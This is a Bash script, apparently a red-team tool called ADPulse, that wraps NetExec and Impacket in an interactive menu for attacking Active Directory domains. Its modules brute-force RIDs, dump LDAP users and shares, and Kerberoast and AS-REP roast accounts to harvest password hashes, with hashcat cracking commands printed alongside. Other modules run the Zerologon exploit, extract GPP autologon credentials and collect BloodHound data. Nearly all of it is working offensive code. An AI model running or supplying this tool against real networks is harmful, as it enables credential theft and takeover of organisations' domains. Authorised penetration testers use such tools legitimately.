#!/bin/bash
set -euo pipefail

readonly VERSION="1.0.0"
readonly TOOL_NAME="ADPulse"

readonly C_G="\e[32m" C_R="\e[31m" C_Y="\e[33m"
readonly C_C="\e[36m" C_M="\e[35m" C_B="\e[1m" C_N="\e[0m"

OUTDIR="" LOGFILE="" DC="" DOMAIN="" DCIP="" DNSIP=""
USER="" PASS="" AUTH_MODE="" USERS_FILE=""

show_banner() {
    echo -e "${C_B}${C_C}"
    cat << 'EOF'
    ___    ____  ____        __
   /   |  / __ \/ __ \__  __/ /________
  / /| | / / / / /_/ / / / / / ___/ _ \
 / ___ |/ /_/ / ____/ /_/ / (__  )  __/
/_/  |_/_____/_/    \__,_/_/____/\___/
EOF
    echo -e "  v${VERSION}${C_N}"
    echo -e "  ${C_M}Active Directory Enumeration Framework${C_N}"
    echo -e "  ${C_M}github.com/redblue-frank/adpulse${C_N}"
    echo
}

banner()     { printf "\n${C_B}${C_C}===== %s =====${C_N}\n" "$1"; }
sub_banner() { printf "${C_B}${C_M}>>> %s …${C_N}\n" "$1"; }
ok()         { printf "${C_G}[+] %s${C_N}\n" "$1"; }
warn()       { printf "${C_Y}[!] %s${C_N}\n" "$1"; }
err()        { printf "${C_R}[-] %s${C_N}\n" "$1"; }
info()       { printf "${C_C}[*] %s${C_N}\n" "$1"; }

run() {
    "$@" 2>&1 | tee -a "$LOGFILE"
    return "${PIPESTATUS[0]}"
}

check_deps() {
    local missing=()
    for cmd in nxc getent awk tee; do
        command -v "$cmd" &>/dev/null || missing+=("$cmd")
    done
    for imp in GetUserSPNs.py GetNPUsers.py; do
        command -v "$imp" &>/dev/null || command -v "${imp%.py}" &>/dev/null || missing+=("$imp")
    done
    if (( ${#missing[@]} )); then
        err "Missing: ${missing[*]}"
        exit 1
    fi
    ok "All dependencies verified"
}

setup_output() {
    OUTDIR="./adpulse_${DOMAIN}_$(date +%Y%m%d_%H%M%S)"
    mkdir -p "$OUTDIR"
    LOGFILE="${OUTDIR}/adpulse.log"
    touch "$LOGFILE"
    ok "Output → $OUTDIR"
}

gather_target() {
    banner "TARGET"
    read -rp $'\e[33m[?] DC FQDN (e.g. DC01.corp.local): \e[0m' DC
    read -rp $'\e[33m[?] Domain (e.g. corp.local): \e[0m' DOMAIN

    DCIP=$(getent hosts "$DC" 2>/dev/null | awk '{print $1}' | head -n 1)
    if [[ -z "$DCIP" ]]; then
        warn "DNS resolution failed for $DC"
        read -rp $'\e[33m[?] DC IP address: \e[0m' DCIP
    fi
    ok "DC → $DC ($DCIP)"
    DNSIP="$DCIP"
}

gather_creds() {
    banner "AUTHENTICATION"
    while true; do
        read -rp $'\e[33m[?] Username (blank for anonymous): \e[0m' USER
        if [[ -z "$USER" ]]; then
            AUTH_MODE="none"
            warn "Anonymous mode — limited checks available"
            return
        fi
        read -rsp $'\e[33m[?] Password: \e[0m' PASS; echo

        info "Validating via SMB …"
        if nxc smb "$DOMAIN" -u "$USER" -p "$PASS" --shares 2>/dev/null | grep -qi "\[+\]"; then
            ok "Authenticated as ${DOMAIN}\\${USER}"
            AUTH_MODE="creds"
            return
        fi
        err "Authentication failed — retry or leave blank for anonymous"
    done
}

require_auth() {
    [[ "$AUTH_MODE" == "creds" ]] && return 0
    err "Requires valid credentials — skipping"
    return 1
}

ensure_users() {
    USERS_FILE="${OUTDIR}/users.txt"
    [[ -s "$USERS_FILE" ]] && return
    info "Building user list …"
    {
        nxc smb "$DOMAIN" -u "$USER" -p "$PASS" --rid-brute 2>/dev/null \
            | grep 'SidTypeUser' | awk -F'\\\\' '{print $NF}' | awk '{print $1}'
        nxc ldap "$DOMAIN" --port 389 -u "$USER" -p "$PASS" --users 2>/dev/null \
            | awk 'NR>1 && /^[A-Za-z0-9]/ {print $1}'
    } | sort -u > "$USERS_FILE"
    ok "$(wc -l < "$USERS_FILE") users → $USERS_FILE"
}

# ===================== MODULES =====================

mod_reachability() {
    sub_banner "Protocol Reachability"
    run nxc smb   "$DOMAIN"              || true
    run nxc ldap  "$DOMAIN" --port 389   || true
    run nxc winrm "$DOMAIN"              || true
    run nxc rdp   "$DOMAIN"              || true
    [[ "$AUTH_MODE" == "creds" ]] && run nxc mssql "$DCIP" -u "$USER" -p "$PASS" || true
}

mod_users() {
    require_auth || return
    sub_banner "RID Brute-Force"
    run nxc smb "$DOMAIN" -u "$USER" -p "$PASS" --rid-brute \
        | grep 'SidTypeUser' | tee -a "$LOGFILE"
    sub_banner "LDAP User Dump"
    run nxc ldap "$DOMAIN" --port 389 -u "$USER" -p "$PASS" --users \
        | tee "${OUTDIR}/ldap_users.txt"
    ensure_users
}

mod_shares() {
    require_auth || return
    sub_banner "SMB Shares"
    run nxc smb "$DOMAIN" -u "$USER" -p "$PASS" --shares \
        | tee "${OUTDIR}/smb_shares.txt"
}

mod_adcs() {
    require_auth || return
    sub_banner "ADCS / Certificate Services"
    local out
    out=$(run nxc ldap "$DOMAIN" --port 389 -u "$USER" -p "$PASS" -M adcs)
    echo "$out" | tee "${OUTDIR}/adcs.txt"
    if echo "$out" | grep -q "Found PKI Enrollment Server"; then
        warn "ADCS detected — enumerate with Certipy (ESC1-ESC16)"
        info "  https://github.com/ly4k/Certipy"
    fi
}

mod_pre2k() {
    require_auth || return
    sub_banner "Pre-Windows 2000 Accounts"
    run nxc ldap "$DOMAIN" --port 389 -u "$USER" -p "$PASS" -M pre2k \
        | tee "${OUTDIR}/pre2k.txt"
}

mod_zerologon() {
    require_auth || return
    sub_banner "Zerologon (CVE-2020-1472)"
    warn "DESTRUCTIVE — may reset machine account password"
    read -rp $'\e[33m[?] Continue? (y/N): \e[0m' confirm
    [[ "${confirm,,}" == "y" ]] || { info "Skipped"; return; }
    run nxc smb "$DOMAIN" -u "$USER" -p "$PASS" -M zerologon \
        | tee "${OUTDIR}/zerologon.txt"
}

mod_gpp() {
    require_auth || return
    sub_banner "GPP AutoLogon"
    run nxc smb "$DOMAIN" -u "$USER" -p "$PASS" -M gpp_autologin \
        | tee "${OUTDIR}/gpp_autologon.txt"
}

mod_bloodhound() {
    require_auth || return
    sub_banner "BloodHound Collection"
    read -rp $'\e[33m[?] DNS Server ['"$DNSIP"$']: \e[0m' custom_dns
    [[ -n "$custom_dns" ]] && DNSIP="$custom_dns"
    run nxc ldap "$DC" --port 389 -u "$USER" -p "$PASS" \
        --bloodhound --collection All --dns-server "$DNSIP" || true
    local zip
    zip=$(ls -t ~/.nxc/logs/*bloodhound.zip 2>/dev/null | head -n 1)
    if [[ -f "$zip" ]]; then
        cp "$zip" "$OUTDIR/"
        ok "BloodHound ZIP → ${OUTDIR}/$(basename "$zip")"
    else
        warn "No BloodHound ZIP produced"
    fi
}

mod_kerberoast() {
    require_auth || return
    sub_banner "Kerberoasting"
    local hf="${OUTDIR}/kerb_hashes.txt"
    run GetUserSPNs.py "$DOMAIN/$USER:$PASS" -dc-ip "$DCIP" -request -outputfile "$hf" || true
    if [[ -s "$hf" ]]; then
        ok "Hashes → $hf"
        info "hashcat -m 13100 '$hf' /usr/share/wordlists/rockyou.txt"
    else
        warn "No Kerberoastable SPNs found"
    fi
}

mod_blind_kerberoast() {
    require_auth || return
    ensure_users
    sub_banner "Blind Kerberoasting"
    local hf="${OUTDIR}/blind_kerb_hashes.txt"
    run GetUserSPNs.py "$DOMAIN/" -usersfile "$USERS_FILE" -dc-host "$DCIP" \
        -no-preauth -outputfile "$hf" || true
    if [[ -s "$hf" ]]; then
        ok "Hashes → $hf"
        info "hashcat -m 13100 '$hf' /usr/share/wordlists/rockyou.txt"
    else
        warn "No blind Kerberoastable accounts"
    fi
}

mod_asrep() {
    require_auth || return
    ensure_users
    sub_banner "AS-REP Roasting"
    local hf="${OUTDIR}/asrep_hashes.txt"
    run GetNPUsers.py "$DOMAIN/" -usersfile "$USERS_FILE" \
        -format hashcat -output "$hf" || true
    if [[ -s "$hf" ]]; then
        ok "Hashes → $hf"
        info "hashcat -m 18200 '$hf' /usr/share/wordlists/rockyou.txt"
    else
        warn "No AS-REP roastable accounts"
    fi
}

mod_run_all() {
    banner "FULL ENUMERATION (Zerologon excluded)"
    mod_reachability
    mod_shares
    mod_users
    mod_pre2k
    mod_adcs
    mod_gpp

    sub_banner "BloodHound Collection"
    run nxc ldap "$DC" --port 389 -u "$USER" -p "$PASS" \
        --bloodhound --collection All --dns-server "$DNSIP" || true
    local zip
    zip=$(ls -t ~/.nxc/logs/*bloodhound.zip 2>/dev/null | head -n 1)
    [[ -f "$zip" ]] && cp "$zip" "$OUTDIR/" && ok "BloodHound ZIP collected"

    mod_kerberoast
    mod_blind_kerberoast
    mod_asrep

    banner "ENUMERATION COMPLETE"
    ok "All output → $OUTDIR"
    ok "Full log  → $LOGFILE"
}

# ===================== MENUS =====================

menu_anon() {
    while true; do
        echo
        echo -e "${C_B}===== ANONYMOUS MODE =====${C_N}"
        echo " 1) Protocol Reachability"
        echo " 0) Exit"
        echo
        read -rp $'\e[33m[?] Option: \e[0m' opt
        case "$opt" in
            1) mod_reachability ;;
            0) ok "Done."; exit 0 ;;
            *) warn "Invalid" ;;
        esac
    done
}

menu_auth() {
    while true; do
        echo
        echo -e "${C_B}===== ENUMERATION MENU =====${C_N}"
        echo "  1) Protocol Reachability"
        echo "  2) User Enumeration (RID + LDAP)"
        echo "  3) SMB Shares"
        echo "  4) ADCS Check"
        echo "  5) Pre-Windows 2000 Accounts"
        echo "  6) Zerologon"
        echo "  7) GPP AutoLogon"
        echo "  8) BloodHound Collection"
        echo "  9) Kerberoasting"
        echo " 10) Blind Kerberoasting"
        echo " 11) AS-REP Roasting"
        echo " 12) RUN ALL"
        echo "  0) Exit"
        echo
        read -rp $'\e[33m[?] Option: \e[0m' opt
        case "$opt" in
            1)  mod_reachability      ;;
            2)  mod_users             ;;
            3)  mod_shares            ;;
            4)  mod_adcs              ;;
            5)  mod_pre2k             ;;
            6)  mod_zerologon         ;;
            7)  mod_gpp               ;;
            8)  mod_bloodhound        ;;
            9)  mod_kerberoast        ;;
            10) mod_blind_kerberoast  ;;
            11) mod_asrep             ;;
            12) mod_run_all           ;;
            0)  ok "Done."; exit 0    ;;
            *)  warn "Invalid"        ;;
        esac
    done
}

main() {
    show_banner
    check_deps
    gather_target
    setup_output
    gather_creds
    case "$AUTH_MODE" in
        none)  menu_anon ;;
        creds) menu_auth ;;
    esac
}

main "$@"
